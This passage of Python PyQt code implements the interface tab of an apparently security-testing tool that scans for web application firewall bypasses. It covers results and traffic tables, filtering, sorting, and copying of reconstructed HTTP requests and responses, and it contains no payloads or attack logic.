        self._status("⏹ Stopped", COLOR_HIGH)
        self._log("⏹ Stopped by user")

    def _show_req_config(self):
        dlg = RequestConfigDialog(self._req_cfg, parent=self)
        if dlg.exec_() == QDialog.Accepted:
            self._req_cfg.update(dlg.values())

    def _clear_all(self):
        if self._worker and self._worker.isRunning():
            self._stop_scan()
        self._probe_entries.clear()
        self._result_entries.clear()
        for t in (self.traffic_table, self.results_table):
            t.setRowCount(0)
        self.probe_request_view.clear()
        self.probe_response_view.clear()
        self.results_summary_lbl.setText("")
        self.waf_info_lbl.clear()
        self.log_view.clear()
        self._status("Ready")

    # ── Worker slots ───────────────────────────────────────────────────────

    def _on_probe(self, entry: ProbeEntry):
        self._probe_entries.append(entry)
        self._add_traffic_row(entry)

    def _on_progress(self, msg: str):
        self._log(msg)
        if any(k in msg for k in ("Phase", "Done", "WAF", "bypass", "AC-Bypass", "Bypass", "Baseline")):
            self._status(msg.strip().lstrip("🔥 ")[:80], COLOR_ACCENT)

    def _on_finished(self, result: Dict):
        self._log("─" * 56)
        self._log("✅ Scan complete")
        self._log(result.get("summary", ""))

        findings = result.get("findings", [])
        self._result_entries = findings
        self.results_table.setRowCount(0)
        for f in findings:
            self._add_result_row(f)

        waf   = result.get("waf_info", {})
        bl    = result.get("baseline", {})
        stats = result.get("stats", {})
        info  = []
        info.append(
            f"WAF : {'Detected — ' + str(waf.get('vendor')) + '  [' + str(waf.get('confidence')) + ']' if waf.get('detected') else 'Not detected in baseline'}"
        )
        info.append(
            f"Block status : {waf.get('block_status','N/A')}   "
            f"Baseline → HTTP {bl.get('status','?')}  len={bl.get('length','?')}  t={bl.get('time','?')}s"
        )
        info.append(
            f"Phases : {stats.get('phases_run','?')}   "
            f"Probes : {stats.get('payloads_sent','?')}   "
            f"Bypasses : {len(findings)}"
        )
        self.waf_info_lbl.setPlainText("\n".join(info))

        if findings:
            self.results_summary_lbl.setStyleSheet(
                f"color:#fff;padding:6px;background:{COLOR_CRITICAL};border-radius:4px;"
            )
            self.results_summary_lbl.setText(
                f"⚠️  {len(findings)} bypass technique(s) found!  "
                f"Best confidence: {findings[0].get('confidence','?')}"
            )
        else:
            self.results_summary_lbl.setStyleSheet(
                f"color:{COLOR_TEXT_BRIGHT};padding:6px;"
                f"background:{COLOR_CARD_BG};border-radius:4px;"
            )
            self.results_summary_lbl.setText("✓ No bypass found with tested techniques.")

        # WAF info box only relevant for WAF mode
        self.waf_info_lbl.setVisible("waf_info" in result)

        # Refresh bypass highlights in-place so rows are never destroyed/recreated
        self._refresh_bypass_highlights()

    def _refresh_bypass_highlights(self):
        """Update the Bypass column (5) and row backgrounds in-place.
        Never calls setRowCount(0) — avoids the cell-disappearing Qt bug."""
        def _it(txt):
            i = QTableWidgetItem(str(txt))
            i.setTextAlignment(Qt.AlignCenter)
            return i
        for row in range(self.traffic_table.rowCount()):
            tech_it = self.traffic_table.item(row, 6)
            if tech_it is None:
                continue
            e = tech_it.data(Qt.UserRole)
            if not isinstance(e, ProbeEntry):
                continue
            bp_it = _it(" YES" if e.bypassed else "")
            if e.bypassed:
                cc = {"HIGH": COLOR_CRITICAL, "MEDIUM": COLOR_HIGH}.get(e.confidence, COLOR_SUCCESS)
                bp_it.setForeground(QBrush(QColor(cc)))
                for c in range(self.traffic_table.columnCount()):
                    it = self.traffic_table.item(row, c)
                    if it:
                        it.setBackground(QBrush(QColor(30, 55, 30)))
            self.traffic_table.setItem(row, 5, bp_it)

    def _on_error(self, error: str):
        self._log(f"❌ {error}")
        self._status(f"❌ {error[:70]}", COLOR_CRITICAL)
        QMessageBox.critical(self, "WAF bypass scan error", error)

    def _on_done(self):
        self.run_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.progress_bar.setVisible(False)
        if self._result_entries:
            self._status(f"⚠️ Done — {len(self._result_entries)} bypass(es)!", COLOR_CRITICAL)
        else:
            self._status("✓ Done — no bypasses found")

    # ── Traffic table ──────────────────────────────────────────────────────

    def _add_traffic_row(self, entry: ProbeEntry):
        ft = self.traffic_filter_edit.text().lower()
        # Bypassed-only filter
        if self.show_bypassed_only.isChecked() and not entry.bypassed:
            return
        # Text filter
        if ft and ft not in entry.url.lower() and ft not in entry.technique.lower():
            return
        # Status filter
        sc = entry.status_code
        sc_filter = self.status_filter_combo.currentText()
        if sc_filter == "2xx" and not (200 <= sc < 300): return
        if sc_filter == "3xx" and not (300 <= sc < 400): return
        if sc_filter == "4xx" and not (400 <= sc < 500): return
        if sc_filter == "5xx" and not (sc >= 500):       return
        if sc_filter == "0 (err)" and sc != 0:           return
        # Length diff filter — compare against baseline length stored on worker
        min_diff = self.len_diff_spin.value()
        if min_diff > 0:
            baseline_len = getattr(self._worker, "_baseline_len", 0) if self._worker else 0
            if abs(entry.length - baseline_len) < min_diff:
                return

        row = self.traffic_table.rowCount()
        self.traffic_table.insertRow(row)

        def _it(txt, a=Qt.AlignCenter):
            i = QTableWidgetItem(str(txt)); i.setTextAlignment(a); return i

        _nit = NumericTableWidgetItem
        idx_it = _nit(str(entry.index)); idx_it.setTextAlignment(Qt.AlignCenter)
        self.traffic_table.setItem(row, 0, idx_it)
        self.traffic_table.setItem(row, 1, _it(entry.method))

        sc = entry.status_code
        sc_it = _nit(str(sc)); sc_it.setTextAlignment(Qt.AlignCenter)
        if sc == 0:
            sc_it.setForeground(QBrush(QColor(COLOR_TEXT_MUTED)))
        elif 200 <= sc < 300:
            sc_it.setForeground(QBrush(QColor(COLOR_SUCCESS)))   # green
        elif 300 <= sc < 400:
            sc_it.setForeground(QBrush(QColor(COLOR_SUCCESS)))   # green (redirects)
        elif sc in (401, 403):
            sc_it.setForeground(QBrush(QColor(COLOR_CRITICAL)))  # red
        else:
            sc_it.setForeground(QBrush(QColor("#f0c040")))       # yellow
        self.traffic_table.setItem(row, 2, sc_it)

        len_it = _nit(str(entry.length)); len_it.setTextAlignment(Qt.AlignCenter)
        self.traffic_table.setItem(row, 3, len_it)
        time_it = _nit(f"{entry.elapsed:.3f}"); time_it.setTextAlignment(Qt.AlignCenter)
        self.traffic_table.setItem(row, 4, time_it)

        bp_it = _it("✅ YES" if entry.bypassed else "")
        if entry.bypassed:
            cc = {"HIGH": COLOR_CRITICAL, "MEDIUM": COLOR_HIGH}.get(entry.confidence, COLOR_SUCCESS)
            bp_it.setForeground(QBrush(QColor(cc)))
            for c in range(self.traffic_table.columnCount()):
                it = self.traffic_table.item(row, c)
                if it: it.setBackground(QBrush(QColor(30, 55, 30)))
        self.traffic_table.setItem(row, 5, bp_it)

        tech_it = QTableWidgetItem(entry.technique)
        tech_it.setToolTip(entry.url)
        self.traffic_table.setItem(row, 6, tech_it)

        # Store the entry object directly — immune to list-size drift
        tech_it.setData(Qt.UserRole, entry)
        if getattr(self, "auto_scroll_btn", None) and self.auto_scroll_btn.isChecked():
            self.traffic_table.scrollToBottom()

    def _on_auto_scroll_toggle(self, checked: bool):
        self.auto_scroll_btn.setText(
            " Auto-scroll: ON" if checked else " Auto-scroll: OFF"
        )

    def _sort_traffic_col(self, col: int):
        """Manual column sort on header click — avoids Qt auto-sort cell-loss bug.
        Tracks sort state ourselves because Qt auto-flips sortIndicatorOrder before
        the sectionClicked signal fires, which would otherwise cancel the toggle."""
        if not hasattr(self, "_sort_state"):
            self._sort_state: Dict[int, Qt.SortOrder] = {}
        # Toggle if same column, default Ascending for a new column
        if col in self._sort_state:
            prev = self._sort_state[col]
            new_order = (Qt.DescendingOrder
                         if prev == Qt.AscendingOrder
                         else Qt.AscendingOrder)
        else:
            new_order = Qt.AscendingOrder
        self._sort_state = {col: new_order}          # reset all; only one active
        self.traffic_table.horizontalHeader().setSortIndicator(col, new_order)
        self.traffic_table.sortItems(col, new_order)

    def _apply_traffic_filter(self):
        self.traffic_table.setRowCount(0)
        for e in self._probe_entries:
            self._add_traffic_row(e)

    @staticmethod
    def _req_line(method: str, url: str) -> str:
        """Return 'METHOD /path?query HTTP/1.1' from a full URL."""
        try:
            import urllib.parse as _up
            p = _up.urlparse(url)
            path = p.path or "/"
            if p.query:
                path = path + "?" + p.query
            if p.fragment:
                path = path + "#" + p.fragment
        except Exception:
            path = url
        return f"{method} {path} HTTP/1.1"

    def _on_traffic_select(self):
        sel = self.traffic_table.selectedItems()
        if not sel:
            return
        # Entry object stored on the technique column (col 6)
        tech_it = self.traffic_table.item(sel[0].row(), 6)
        if not tech_it:
            return
        e = tech_it.data(Qt.UserRole)
        if not isinstance(e, ProbeEntry):
            return

        # Request — relative path form (GET /path?q=v HTTP/1.1)
        req = [self._req_line(e.method, e.url)]
        # Ensure Host header is present and first
        host_added = False
        try:
            import urllib.parse as _up
            host_val = _up.urlparse(e.url).netloc
            if host_val:
                req.append(f"Host: {host_val}")
                host_added = True
        except Exception:
            pass
        for k, v in e.request_headers.items():
            if host_added and k.lower() == "host":
                continue
            req.append(f"{k}: {v}")
        if e.request_body:
            req += ["", e.request_body]
        self.probe_request_view.setPlainText("\n".join(req))

        # Response — include all headers
        resp = [f"HTTP/1.1 {e.status_code}"]
        resp += [f"{k}: {v}" for k, v in e.response_headers.items()]
        resp += ["", e.response_body]
        self.probe_response_view.setPlainText("\n".join(resp))

    def _traffic_ctx(self, pos):
        row = self.traffic_table.rowAt(pos.y())
        if row < 0: return
        tech_it = self.traffic_table.item(row, 6)
        if not tech_it: return
        e = tech_it.data(Qt.UserRole)
        if not isinstance(e, ProbeEntry): return

        menu = QMenu()
        a_url  = menu.addAction("📋 Copy URL")
        a_req  = menu.addAction("📋 Copy Request")
        a_resp = menu.addAction("📋 Copy Response")
        act = menu.exec_(self.traffic_table.viewport().mapToGlobal(pos))

        if act == a_url:
            QApplication.clipboard().setText(e.url)
        elif act == a_req:
            lines = [self._req_line(e.method, e.url)]
            try:
                import urllib.parse as _up
                hv = _up.urlparse(e.url).netloc
                if hv: lines.append(f"Host: {hv}")
            except Exception:
                pass
            for k, v in e.request_headers.items():
                if k.lower() == "host": continue
                lines.append(f"{k}: {v}")
            if e.request_body: lines += ["", e.request_body]
            QApplication.clipboard().setText("\n".join(lines))
        elif act == a_resp:
            lines = [f"HTTP/1.1 {e.status_code}"]
            lines += [f"{k}: {v}" for k, v in e.response_headers.items()]
            lines += ["", e.response_body]
            QApplication.clipboard().setText("\n".join(lines))

    # ── Results table ──────────────────────────────────────────────────────

    def _add_result_row(self, f: Dict):
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        conf = f.get("confidence", "LOW")
        cc   = {"HIGH": COLOR_CRITICAL, "MEDIUM": COLOR_HIGH, "LOW": COLOR_TEXT_MUTED}.get(conf, COLOR_TEXT)

        def _it(txt, a=Qt.AlignCenter):
            i = QTableWidgetItem(str(txt)); i.setTextAlignment(a); return i

        c_it = _it(conf); c_it.setForeground(QBrush(QColor(cc))); c_it.setFont(QFont("",  -1, QFont.Bold))
        self.results_table.setItem(row, 0, c_it)

        sc_it = _it(f.get("status_code",""))
        sc = f.get("status_code", 0)
        if 200 <= sc < 300: sc_it.setForeground(QBrush(QColor(COLOR_SUCCESS)))
        self.results_table.setItem(row, 1, sc_it)
        self.results_table.setItem(row, 2, _it(f.get("length","")))
        d = f.get("delta_len","")
        self.results_table.setItem(row, 3, _it(f"{d:+d}" if isinstance(d,int) else str(d)))
        ev = QTableWidgetItem(f.get("evidence","")); ev.setToolTip(f.get("evidence",""))
        self.results_table.setItem(row, 4, ev)
        te = QTableWidgetItem(f.get("technique","")); te.setToolTip(f.get("url",""))
        self.results_table.setItem(row, 5, te)

        bg = {"HIGH": QColor(60,20,20), "MEDIUM": QColor(60,40,10), "LOW": QColor(40,40,40)}.get(conf)
        if bg:
            for c in range(self.results_table.columnCount()):
                it = self.results_table.item(row, c)
                if it: it.setBackground(QBrush(bg))

    # ── Helpers ────────────────────────────────────────────────────────────

    def _log(self, msg: str):
        self.log_view.append(msg)
        self.log_view.moveCursor(QTextCursor.End)

    def _status(self, msg: str, color: str = COLOR_TEXT_MUTED):
        self.status_lbl.setText(msg)
        self.status_lbl.setStyleSheet(f"color:{color};")


# ─────────────────────────────────────────────────────────────────────────────
# Integration helper
# ─────────────────────────────────────────────────────────────────────────────

def add_bypass_tab(parent):
    """
    Call in HuntGUI._setup_tabs() after JS Miner, before API Keys:

        from bypass_tab import add_bypass_tab
        add_bypass_tab(self)
        self.waf_bypass_ref = self.bypass_tab
    """
    tab = BypassTab(parent)
    parent.tab_widget.addTab(tab, "🛡 Bypass")
    parent.waf_bypass_tab = tab   # backwards compat
    parent.bypass_tab = tab
    return tab


def add_waf_bypass_tab(parent):  # backwards-compat alias
    return add_bypass_tab(parent)